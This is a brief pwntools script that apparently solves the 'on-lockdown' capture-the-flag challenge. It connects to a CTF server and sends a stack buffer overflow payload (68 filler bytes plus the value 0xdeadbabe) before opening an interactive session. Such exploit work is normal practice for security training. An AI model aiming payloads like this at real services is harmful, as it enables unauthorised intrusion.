from pwn import *

elf = context.binary = ELF("./on-lockdown")

#r = process(elf.path)
r = remote("ctf.umbccd.io", 4500)

payload = ""
payload += "A" * 68
payload += p32(0xdeadbabe)
r.sendlineafter("Can you convince him to give it to you?\n", payload)

r.interactive()
